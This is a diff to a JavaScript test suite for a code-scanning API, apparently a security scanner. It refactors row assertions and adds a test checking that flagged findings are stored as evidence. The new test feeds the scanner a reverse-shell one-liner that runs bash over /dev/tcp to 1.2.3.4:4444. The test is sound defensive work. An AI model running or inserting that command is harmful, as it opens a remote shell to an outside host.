@@ -12,6 +12,10 @@ process.env.DYNAMIC_SANDBOX_ENABLED = "false";
 const insertedRows = [];
 const rpcCalls = [];
 
+function insertedFor(table) {
+  return insertedRows.filter(item => item.table === table);
+}
+
 const originalLoad = Module._load;
 Module._load = function patchedLoad(request, parent, isMain) {
   if (request === "@supabase/supabase-js") {
@@ -327,12 +331,14 @@ async function testManualScanPersistsDashboardMetadata() {
   }, res);
 
   assert.equal(res.statusCode, 200);
-  assert.equal(insertedRows.length, 1);
-  assert.equal(insertedRows[0].table, "site_scans");
-  assert.equal(insertedRows[0].row.scope, "skill");
-  assert.equal(insertedRows[0].row.status, "STATUS_SAFE");
-  assert.equal(insertedRows[0].row.threat_score, 2);
-  assert.ok(!Object.prototype.hasOwnProperty.call(insertedRows[0].row, "code"));
+  const siteRows = insertedFor("site_scans");
+  assert.equal(siteRows.length, 1);
+  assert.equal(siteRows[0].row.scope, "skill");
+  assert.equal(siteRows[0].row.status, "STATUS_SAFE");
+  assert.equal(siteRows[0].row.threat_score, 2);
+  assert.ok(siteRows[0].row.scan_run_id);
+  assert.ok(!Object.prototype.hasOwnProperty.call(siteRows[0].row, "code"));
+  assert.equal(insertedFor("cg_scan_evidence").length, 0);
   assert.equal(rpcCalls.length, 1);
 }
 
@@ -354,9 +360,9 @@ async function testAdminBypassSkipsUsageLimitsButPersistsDashboardMetadata() {
 
   assert.equal(res.statusCode, 200);
   assert.equal(rpcCalls.length, 0);
-  assert.equal(insertedRows.length, 1);
-  assert.equal(insertedRows[0].table, "site_scans");
-  assert.equal(insertedRows[0].row.scope, "mcp");
+  const siteRows = insertedFor("site_scans");
+  assert.equal(siteRows.length, 1);
+  assert.equal(siteRows[0].row.scope, "mcp");
 }
 
 async function testAdminTokenBypassSkipsUsageLimits() {
@@ -377,9 +383,38 @@ async function testAdminTokenBypassSkipsUsageLimits() {
 
   assert.equal(res.statusCode, 200);
   assert.equal(rpcCalls.length, 0);
-  assert.equal(insertedRows.length, 1);
-  assert.equal(insertedRows[0].row.scope, "skill");
+  const siteRows = insertedFor("site_scans");
+  assert.equal(siteRows.length, 1);
+  assert.equal(siteRows[0].row.scope, "skill");
   assert.equal(res.body._admin_bypass, true);
+}
+
+async function testThreatScanPersistsEvidenceRows() {
+  insertedRows.length = 0;
+  rpcCalls.length = 0;
+  const res = mockRes();
+  await scan({
+    method: "POST",
+    headers: {
+      origin: "https://cyberguardianscan.com",
+      host: "cyberguardianscan.com",
+      "x-forwarded-for": "203.0.113.51",
+      "x-cg-admin-secret": "developer-secret",
+    },
+    body: { code: 'const { exec } = require("child_process"); exec("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");', scope: "mcp" },
+    url: "/api/scan",
+  }, res);
+
+  assert.equal(res.statusCode, 200);
+  const siteRows = insertedFor("site_scans");
+  const evidenceInserts = insertedFor("cg_scan_evidence");
+  assert.equal(siteRows.length, 1);
+  assert.equal(evidenceInserts.length, 1);
+  assert.ok(Array.isArray(evidenceInserts[0].row));
+  assert.ok(evidenceInserts[0].row.length >= 1);
+  assert.equal(evidenceInserts[0].row[0].scan_run_id, siteRows[0].row.scan_run_id);
+  assert.ok(evidenceInserts[0].row.some(item => item.family === "REVERSE_SHELL" || item.family === "OS_COMMAND_EXECUTION"));
+  assert.ok(evidenceInserts[0].row.every(item => item.fix_key));
 }
 
 async function testProviderTimeoutFallsBackToCompletedScan() {
@@ -408,8 +443,9 @@ async function testProviderTimeoutFallsBackToCompletedScan() {
     assert.equal(res.statusCode, 200);
     assert.equal(res.body.status, "STATUS_MODERATE");
     assert.ok(!res.body.error);
-    assert.equal(insertedRows.length, 1);
-    assert.equal(insertedRows[0].row.scope, "skill");
+    const siteRows = insertedFor("site_scans");
+    assert.equal(siteRows.length, 1);
+    assert.equal(siteRows[0].row.scope, "skill");
   } finally {
     global.fetch = originalFetch || successfulFetch;
   }
@@ -446,9 +482,10 @@ async function testCachedScanStillPersistsCurrentScope() {
 
   assert.equal(first.statusCode, 200);
   assert.equal(second.statusCode, 200);
-  assert.equal(insertedRows.length, 2);
-  assert.equal(insertedRows[0].row.scope, "skill");
-  assert.equal(insertedRows[1].row.scope, "mcp");
+  const siteRows = insertedFor("site_scans");
+  assert.equal(siteRows.length, 2);
+  assert.equal(siteRows[0].row.scope, "skill");
+  assert.equal(siteRows[1].row.scope, "mcp");
 }
 
 async function testBatchScannerCanSkipApiPersistence() {
@@ -487,8 +524,9 @@ async function testSupplyChainScopesPersist() {
   }, res);
 
   assert.equal(res.statusCode, 200);
-  assert.equal(insertedRows.length, 1);
-  assert.equal(insertedRows[0].row.scope, "github_action");
+  const siteRows = insertedFor("site_scans");
+  assert.equal(siteRows.length, 1);
+  assert.equal(siteRows[0].row.scope, "github_action");
 }
 
 testStaticReverseShell();
@@ -511,6 +549,7 @@ testPublicResponseHidesInternalAnalysis();
 testManualScanPersistsDashboardMetadata()
   .then(testAdminBypassSkipsUsageLimitsButPersistsDashboardMetadata)
   .then(testAdminTokenBypassSkipsUsageLimits)
+  .then(testThreatScanPersistsEvidenceRows)
   .then(testProviderTimeoutFallsBackToCompletedScan)
   .then(testCachedScanStillPersistsCurrentScope)
   .then(testBatchScannerCanSkipApiPersistence)
